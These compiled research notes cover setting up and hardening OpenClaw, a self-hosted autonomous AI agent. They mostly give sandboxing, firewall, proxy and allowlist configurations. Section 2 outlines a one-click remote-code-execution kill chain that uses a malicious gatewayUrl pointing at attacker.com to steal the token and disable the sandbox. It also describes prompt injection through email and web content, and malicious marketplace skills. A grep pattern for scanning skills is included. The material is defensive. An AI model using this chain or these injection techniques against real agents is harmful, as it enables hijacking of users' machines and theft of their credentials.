# OpenClaw Research: Setup, Security & Best Practices

Compiled from 20+ X threads, security guides, official docs, and GitHub repos (Feb 2026).

---

## 1. WHAT IS OPENCLAW

OpenClaw (formerly ClawdBot, then MoltBot) is an open-source autonomous AI agent that runs on your own hardware. It's a self-hosted alternative to ChatGPT/Claude that can manage email, calendar, messaging (Telegram/WhatsApp/Discord), browse the web, execute shell commands, read/write files, and run cron jobs. Created by Peter Steinberger. 145K+ GitHub stars, fastest-growing open-source AI project.

**Architecture:**
- **Gateway**: Control plane that manages agent lifecycle, authentication, WebSocket connections
- **Agent Runtime**: Node.js process that executes tasks with access to tools/skills
- **Skills**: Extensible plugins from ClawHub marketplace (WARNING: security risk — see below)
- **Memory**: Persistent context via Voyage AI embeddings + markdown files
- **Sessions**: Isolated conversation contexts per agent
- **Channels**: Telegram, WhatsApp, Discord, web UI integrations

**Key ports:**
- `18789` — Gateway (control UI + WebSocket)
- `18790` — Bridge (inter-agent communication)

---

## 2. CRITICAL SECURITY VULNERABILITIES

### CVE-2026-25253: 1-Click RCE (CVSS 8.8) — PATCHED in v2026.1.29

**What:** Visiting a single malicious web page lets attackers steal your gateway token via unvalidated WebSocket origins, then execute arbitrary commands on your machine.

**Kill chain:**
1. Victim clicks malicious link (`?gatewayUrl=wss://attacker.com/exfil`)
2. Control UI auto-connects and sends gateway token to attacker
3. Attacker uses token for Cross-Site WebSocket Hijacking (no origin validation)
4. Attacker disables sandbox (`exec.approvals.set` + `config.patch`)
5. Attacker executes arbitrary shell commands via `node.invoke`

**Exploitable even on localhost-only setups** — the victim's browser initiates the outbound connection.

**Fix:** Update to v2026.1.29+, rotate gateway token, rotate all API keys.

### ClawHub Marketplace Malware

- **The #1 most downloaded skill on ClawHub was malware** (reported by Jason Meller at 1Password)
- It was a coordinated campaign, not a one-off
- Typosquatting, clones, and supply chain attacks are common
- Skills can contain obfuscated payloads that bypass antivirus

### Prompt Injection via Email/Web

- If your agent reads email, **anyone can prompt-inject it by sending you an email**
- Web content can contain hidden instructions that override agent behavior
- This can lead to data exfiltration, unauthorized actions, credential theft

**Bottom line:** OpenClaw has powerful capabilities but also a massive attack surface. Security is NOT optional.

---

## 3. THE TWO SAFE APPROACHES (by cocktailpeanut/Pinokio)

### Approach A: Pure Offline / Local Mode
- No third-party services, no APIs, decline all skills
- Use it for file organization, local dev, querying filesystem
- Like running CLI agents with `--dangerously-bypass-approvals-and-sandbox`

### Approach B: Online Mode — Fresh Separate Accounts Only
- Create NEW accounts for everything (email, Telegram, GitHub, etc.)
- Think of it as spawning a new digital entity, NOT extending yourself
- Host on a VPS, not your personal machine
- **NEVER connect**: primary email, banking, password managers, work accounts, social media, crypto wallets, government portals

### NEVER MIX THE TWO — that's where disasters happen

---

## 4. DOCKER SETUP (Official Docs)

### Quick Start
```bash
git clone https://github.com/openclaw/openclaw.git
cd openclaw
./docker-setup.sh
```

This builds the image, runs onboarding, generates gateway token in `.env`, and starts via Docker Compose.

### Manual Docker Compose
```bash
docker build -t openclaw:local -f Dockerfile .
docker compose run --rm openclaw-cli onboard
docker compose up -d openclaw-gateway
```

### Environment Variables (set before running setup)
```bash
export OPENCLAW_DOCKER_APT_PACKAGES="ffmpeg build-essential"  # system packages
export OPENCLAW_EXTRA_MOUNTS="$HOME/.codex:/home/node/.codex:ro"  # bind mounts
export OPENCLAW_HOME_VOLUME="openclaw_home"  # persist /home/node
```

### Access
- Control UI: `http://127.0.0.1:18789/`
- Dashboard links: `docker compose run --rm openclaw-cli dashboard --no-open`
- Device pairing: `docker compose run --rm openclaw-cli devices approve <requestId>`

### Channel Setup
```bash
# Telegram
docker compose run --rm openclaw-cli channels add --channel telegram --token "<token>"

# WhatsApp (QR code)
docker compose run --rm openclaw-cli channels login

# Discord
docker compose run --rm openclaw-cli channels add --channel discord --token "<token>"
```

### Shell Helpers (ClawDock)
```bash
mkdir -p ~/.clawdock && curl -sL https://raw.githubusercontent.com/openclaw/openclaw/main/scripts/shell-helpers/clawdock-helpers.sh -o ~/.clawdock/clawdock-helpers.sh
echo 'source ~/.clawdock/clawdock-helpers.sh' >> ~/.zshrc && source ~/.zshrc
# Commands: clawdock-start, clawdock-stop, clawdock-dashboard, etc.
```

---

## 5. AGENT SANDBOXING (Official Docker Config)

Non-main sessions can execute tools in isolated Docker containers:

```json5
{
  agents: {
    defaults: {
      sandbox: {
        mode: "non-main",        // off | non-main | all
        scope: "agent",          // session | agent | shared
        workspaceAccess: "none", // none | ro | rw
        workspaceRoot: "~/.openclaw/sandboxes",
        docker: {
          image: "openclaw-sandbox:bookworm-slim",
          readOnlyRoot: true,
          network: "none",       // CRITICAL: no egress by default
          user: "1000:1000",
          memory: "1g",
          cpus: 1,
          capDrop: ["ALL"],
          pidsLimit: 100,
          seccompProfile: "default",
          apparmorProfile: "default"
        },
        prune: {
          idleHours: 24,
          maxAgeDays: 7
        }
      }
    }
  }
}
```

### Tool Allow/Deny Lists
```json5
{
  tools: {
    sandbox: {
      tools: {
        allow: ["exec", "process", "read", "write", "edit"],
        deny: ["browser", "canvas", "nodes", "cron", "discord", "gateway"]
      }
    }
  }
}
```

**Policy: deny wins over allow.** Empty allow = all tools permitted (except denied).

### Sandbox Images
```bash
scripts/sandbox-setup.sh            # Minimal (bookworm-slim)
scripts/sandbox-common-setup.sh     # + dev tooling
scripts/sandbox-browser-setup.sh    # + browser support
```

---

## 6. SECURITY HARDENING — 3-TIER GUIDE

### TIER 1: Basic Protection (3-4 hours)

**1. Isolated VPS Setup**
```bash
useradd -r -m -d /opt/OpenClaw -s /bin/bash OpenClaw
# Disable root SSH + password auth
sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart sshd
dpkg-reconfigure -plow unattended-upgrades
```

**2. Firewall**
```bash
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp comment 'SSH'
# DO NOT open port 18789 publicly
ufw enable
```

**3. Tailscale (secure remote access)**
```bash
curl -fsSL https://tailscale.com/install.sh | sh
tailscale up --ssh
# Access via http://100.x.x.x:18789 from Tailscale network
```

**4. Node.js 22+ required** (CVE-2026-21636 fix)

**5. File Permissions**
```bash
chmod 700 ~/.clawdbot
chmod 600 ~/.clawdbot/OpenClaw.json
chmod 600 ~/.clawdbot/gateway.yaml
chmod -R 600 ~/.clawdbot/credentials/
```

**6. Gateway Configuration (CRITICAL)**
```yaml
gateway:
  host: "127.0.0.1"  # NEVER 0.0.0.0
  port: 18789
  trustedProxies:
    - "100.64.0.0/10"   # Tailscale range
  controlUi:
    dangerouslyDisableDeviceAuth: false  # NEVER set true
mdns:
  enabled: false  # Disable broadcasting
```

**7. Filesystem Restrictions**
```yaml
tools:
  filesystem:
    enabled: true
    allowedPaths:
      - "/opt/OpenClaw/workspace"
    deniedPaths:
      - "/home/OpenClaw/.ssh"
      - "/home/OpenClaw/.clawdbot/credentials"
      - "/etc"
      - "/root"
```

**8. Credential Encryption** — Use `age` or `pass` to encrypt credentials at rest. OpenClaw stores secrets in plaintext by default.

**9. DM Policy** — Never use `"dmPolicy": "open"` with `"allowFrom": ["*"]`. Use `"pairing"` mode.

**10. Run security audit:** `OpenClaw security audit --deep`

### TIER 2: Standard Protection (+2 hours)

**1. Tool Allowlisting (whitelist, NOT denylist)**
```yaml
tools:
  shell:
    enabled: true
    allowlist: ["ls", "cat", "grep", "head", "tail", "find", "wc", "sort"]
```

**2. MCP Server Configuration**
```json
{
  "mcpServers": {
    "memory": {
      "version": "0.3.0",
      "autoUpdate": false,
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-memory@0.3.0"]
    }
  }
}
```
Rules:
- NEVER `"enableAllProjectMcpServers": true`
- ALWAYS version pin, NEVER `"latest"`
- ALWAYS `"autoUpdate": false`

**3. OAuth Scope Minimization**
- Gmail: `readonly` not `full`
- GitHub: `public_repo` not `repo`
- Review monthly: https://myaccount.google.com/permissions

**4. Weekly Security Monitoring Script** — Checks for exposed ports, config changes, prompt injection attempts, dangerous commands in session logs.

**5. Monthly Maintenance:**
- Rotate gateway auth token
- Review installed skills/MCP servers
- Audit session logs for unexpected activity
- Encrypted backup

### TIER 3: Advanced Protection (+2-3 hours)

**1. Docker/Podman Sandbox with LiteLLM Proxy**

Architecture:
```
[OpenClaw Agent] --internal network--> [LiteLLM Proxy] --external--> [Anthropic API]

OpenClaw has NO external internet access. Only LiteLLM can reach outside.
```

```yaml
# docker-compose.yml
version: '3.8'
services:
  litellm:
    image: ghcr.io/berriai/litellm:main-latest
    ports: ["127.0.0.1:4000:4000"]
    networks: [openclaw-internal, openclaw-external]
    security_opt: [no-new-privileges:true]
    read_only: true
    mem_limit: 512m

  openclaw:
    image: node:22-alpine
    networks: [openclaw-internal]  # NO external network
    ports: ["127.0.0.1:18789:18789"]
    user: "1000:1000"
    environment:
      - ANTHROPIC_API_BASE=http://litellm:4000/v1
      - ANTHROPIC_API_KEY=${LITELLM_MASTER_KEY}
    security_opt: [no-new-privileges:true]
    cap_drop: [ALL]
    read_only: true
    mem_limit: 2g

networks:
  openclaw-internal:
    internal: true  # NO external internet
  openclaw-external:
    driver: bridge
```

**Verification:**
```bash
# OpenClaw has NO external network
docker exec OpenClaw-agent ping -c 1 8.8.8.8  # Should FAIL

# OpenClaw CAN reach LiteLLM
docker exec OpenClaw-agent nc -zv litellm 4000  # Should succeed

# Not running as root
docker exec OpenClaw-agent id  # uid=1000

# Read-only filesystem
docker exec OpenClaw-agent touch /test-file  # Should fail
```

**2. Squid Proxy for Domain Allowlisting**

Add a Squid proxy that allowlists specific domains. OpenClaw traffic goes through proxy:
```yaml
openclaw:
  environment:
    - HTTP_PROXY=http://squid:3128
    - HTTPS_PROXY=http://squid:3128
    - NO_PROXY=litellm,127.0.0.1,localhost
```

allowlist.txt:
```
.google.com
.googleapis.com
.github.com
.npmjs.org
.telegram.org
# Add only what you explicitly need
```

**3. Granular Exec Approvals per Agent**
```json
{
  "defaults": {
    "security": "allowlist",
    "ask": "on-miss",
    "askFallback": "deny"
  },
  "agents": {
    "dev": {
      "allowlist": ["/usr/bin/ls", "/usr/bin/cat", "/usr/bin/grep"]
    },
    "research": {
      "allowlist": ["/usr/bin/curl", "/usr/bin/wget", "/usr/bin/jq"]
    }
  }
}
```

**4. Separate Agents by Risk Profile**
- File organization agent: filesystem only, no shell, no network
- Dev agent: limited shell + filesystem, no network, no credentials
- Research agent: network via proxy, no shell

**5. Incident Response Plan** — Pre-write procedures: stop services, block network, preserve evidence, revoke ALL credentials, rebuild from scratch.

**6. Ansible Automation** — https://github.com/Next-Kick/openclaw-hardened-ansible deploys all 3 tiers in ~30 min vs 7-9 hours manual.

---

## 7. SECRET MANAGEMENT (Bill D'Alessandro's approach)

- **Sandbox with UTM**: Run OpenClaw in a VM (UTM is free on Mac). Isolated filesystem, isolated OS. If corrupted, delete the entire VM.
- **1Password Integration**: OpenClaw stores secrets in plaintext by default. Teach it to use 1Password:
  1. Create dedicated vault "Shared with OpenClaw"
  2. Create Service Account with access only to that vault
  3. Store all API keys, tokens, passwords in the vault
  4. Agent retrieves secrets via 1Password CLI

---

## 8. SKILLS & SECURITY SKILLS

### Dangerous Skills to Avoid
- Any skill from unverified publishers
- Skills with high downloads but no source code review
- Skills that request broad permissions

### Recommended Security Skills
1. **ACIP** (Advanced Cognitive Inoculation Prompt) — Prompt injection resistance
2. **Prompt-Guard** — Additional injection boundaries
3. **SkillGuard** — Audits other skills for security issues before installation
4. **Email Security Skill** (by @ivaavimusic) — Protects against prompt injection via email

### Before Installing ANY Skill
```bash
npm pack @scope/skill-name@x.y.z
tar -xzf *.tgz
# Read EVERY line of source code
grep -r "eval(\|exec(\|spawn(\|fetch(\|http.request\|password\|api_key\|secret" package/
npm audit
```

Don't install if you find: unexpected network calls, credential access beyond docs, code obfuscation, eval/dynamic execution.

---

## 9. RALPH — AUTONOMOUS AI CODING LOOP

**What:** Ralph (by Ryan Carson / snarktank) is an autonomous loop that runs AI coding tools (Claude Code or Amp) repeatedly until all PRD items are complete. Each iteration spawns a fresh context.

**Memory persists via:**
- Git history (commits from previous iterations)
- `progress.txt` (append-only learnings/gotchas)
- `prd.json` (task status tracking)

**Install (Claude Code):**
```
/plugin marketplace add snarktank/ralph
/plugin install ralph-skills@ralph-marketplace
```

**Workflow:**
1. `/prd` — Generate a product requirements doc with user stories
2. Convert to `prd.json` with structured stories
3. `./scripts/ralph/ralph.sh [iterations]` — Run the loop

**Key rules:**
- Stories must fit in ONE context window
- Right-sized: "add a DB column with migration", "insert a UI component"
- Too big: "build entire dashboard", "add authentication"

**Antfarm** — Multi-agent extension for OpenClaw:
- Pre-built workflows: `feature-dev` (7 agents), `security-audit` (7 agents), `bug-fix` (6 agents)
- Uses YAML + SQLite + cron (no Redis/Kafka)
- Fresh context per step, mutual verification (devs don't self-verify)
- Install: `git clone https://github.com/snarktank/antfarm.git ~/.openclaw/workspace/antfarm`
- Security: Only installs from official repo, all workflows reviewed for prompt injection

---

## 10. STARTCLAW — 1-Click Deploy

StartClaw (by Idan Mann, @mann_idan) lets you deploy OpenClaw in under 60 seconds:
- Hosted, no server setup, no API key needed
- 48-hour free trial
- One-click access to Gmail, LinkedIn, Twitter integrations
- Good for trying out OpenClaw without the setup pain

Other 1-click options:
- **Pinokio** (by cocktailpeanut) — 1-click launcher for Windows/Mac/Linux
- **DigitalOcean** — Pre-configured droplet with security features
- **Hostinger** — Setup tutorials available

---

## 11. OPENCLAW VERSIONS & FEATURES

### v2026.2.9 (Latest at time of research)
- Grok web search provider
- No more post-compaction amnesia
- Context overflow recovery
- Cron reliability overhaul
- 40+ fixes from 25+ contributors

### v2026.2.6
- Opus 4.6 + GPT-5.3-Codex support
- xAI Grok + Baidu Qianfan providers
- Token usage dashboard
- Voyage AI for memory
- **Skill code safety scanner** (new!)
- Security hardening across the board

### v2026.1.29
- Critical security patch for CVE-2026-25253
- Gateway URL confirmation modal

---

## 12. COST OPTIMIZATION

**openclaw-optimizer** tool fixes 3 biggest cost killers:
1. Context bloat
2. Wrong model selection (Haiku vs Sonnet router)
3. Browser loops

Claims to cut API costs 85-95%.

**ClawRouter** — Open-source smart LLM router that scores each request across 14 dimensions and routes to cheapest capable model.

**ChatGPT OAuth** — Simon Willison recommends using OpenAI Codex with ChatGPT OAuth to control token spending (uses your subscription instead of API credits).

---

## 13. KEY GOTCHAS & TIPS

1. **Node.js 22+ required** — CVE-2026-21636 fix. Always verify: `node --version`
2. **Never bind to 0.0.0.0** — Always `127.0.0.1` for gateway
3. **Disable mDNS** — Prevents broadcasting your instance on the network
4. **Rotate credentials quarterly** — API keys, gateway tokens, OAuth sessions, SSH keys
5. **21,639 exposed OpenClaw instances** found by Censys — don't be one of them
6. **Multiple Telegram threads** — Create a Telegram group with Topics enabled, add your bot. OpenClaw handles multiple topics natively.
7. **Podman over Docker** — Rootless by default, more secure. Use `loginctl enable-linger` for persistence.
8. **Name changed 3 times** — ClawdBot → MoltBot → OpenClaw. Some docs/packages still use old names.
9. **Alex Finn's tips**: Brain-dump EVERYTHING about yourself to the agent (goals, business details, contacts, preferences). Build an activity feed to track what it does autonomously.
10. **Opus 4.6 not supported by default** — Requires manual config hacking.

---

## 14. RELEVANT FOR INSTANTWORKER

### What applies to our Docker/OpenClaw setup:

**Security (MUST DO):**
- Gateway must bind to `127.0.0.1`, NEVER `0.0.0.0`
- Use `dangerouslyDisableDeviceAuth: false` always
- Run containers as non-root (uid 1000)
- Drop ALL Linux capabilities (`cap_drop: ALL`)
- Read-only root filesystem with tmpfs for writable areas
- Network isolation: agent on internal-only network, proxy on both
- Version pin all dependencies, never use `latest`
- Encrypt credentials at rest
- Implement tool allowlists (not denylists)

**Architecture (CONSIDER):**
- LiteLLM proxy between agent and API (credential isolation + rate limiting + budget control)
- Squid proxy for domain allowlisting (deny-by-default egress)
- Separate agents by risk profile (file agent vs dev agent vs research agent)
- Tailscale for secure remote access instead of exposing ports

**Monitoring (SHOULD DO):**
- Weekly security audit script
- Check for prompt injection patterns in session logs
- Monitor API usage for spikes
- Verify gateway binding with `ss -tlnp | grep 18789`
- Log and review Squid denied requests

**Multi-Agent (FUTURE):**
- Antfarm pattern for orchestrating agent teams
- Ralph loop for autonomous coding tasks
- Fresh context per step prevents hallucination buildup

---

## Sources

### Security Guides
- [3-Tier Hardening Guide](https://aimaker.substack.com/p/openclaw-security-hardening-guide)
- [Composio Security Guide](https://composio.dev/blog/secure-openclaw-moltbot-clawdbot-setup)
- [Medium VPS Hardening](https://alirezarezvani.medium.com/openclaw-security-my-complete-hardening-guide-for-vps-and-docker-deployments-14d754edfc1e)
- [Medium Production Deployment](https://medium.com/@srikanthbellary01/secure-deployment-of-autonomous-ai-agents-hardening-openclaw-in-docker-faa03b04851d)
- [Ansible Playbook](https://github.com/Next-Kick/openclaw-hardened-ansible)

### Official Docs
- [OpenClaw Docker Docs](https://docs.openclaw.ai/install/docker)
- [GitHub Advisory GHSA-g8p2-7wf7-98mq](https://github.com/openclaw/openclaw/security/advisories/GHSA-g8p2-7wf7-98mq)

### CVE / Vulnerability
- [CVE-2026-25253 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2026-25253)
- [DepthFirst Write-up](https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys)
- [TheHackerNews](https://thehackernews.com/2026/02/openclaw-bug-enables-one-click-remote.html)
- [Veracode ClawHub Analysis](https://www.veracode.com/blog/clawing-for-scraps-openclaw-clawdbot/)

### X Threads
- [@cocktailpeanut — 2 Safe Ways](https://x.com/cocktailpeanut/status/2017328971327607263)
- [@VittoStack — Security-First Guide](https://x.com/VittoStack/status/2018326274440073499)
- [@JordanLyall — Hardened Setup](https://x.com/JordanLyall/status/2019595380963627236)
- [@BillDA — UTM + 1Password](https://x.com/BillDA/status/2017650241101598872)
- [@123skely — Quick Start Guide](https://x.com/123skely/status/2021403820576907551)
- [@michael_chomsky — StartClaw](https://x.com/michael_chomsky/status/2021433892402864257)
- [@ryancarson — Ralph & Antfarm](https://x.com/ryancarson/status/2020931274219594107)
- [@AlexFinn — Brain Dump Strategy](https://x.com/AlexFinn/status/2017445769431945594)
- [@ivaavimusic — Email Security Skill](https://x.com/ivaavimusic/status/2020847588359200975)
- [@ideabrowser — ClawHub Malware](https://x.com/ideabrowser/status/2019849490451362283)
- [@LLMJunky — Obfuscated Exploits](https://x.com/LLMJunky/status/2019846649972158746)
- [@leviathan_news — Security-First 9 Steps](https://x.com/leviathan_news/status/2018369029547647311)

### Tools & Repos
- [snarktank/ralph](https://github.com/snarktank/ralph) — Autonomous AI coding loop (10K+ stars)
- [snarktank/antfarm](https://github.com/snarktank/antfarm) — Multi-agent team orchestration for OpenClaw
- [Simon Willison Docker TIL](https://til.simonwillison.net/llms/openclaw-docker)
- [DigitalOcean Tutorial](https://www.digitalocean.com/community/tutorials/how-to-run-openclaw)
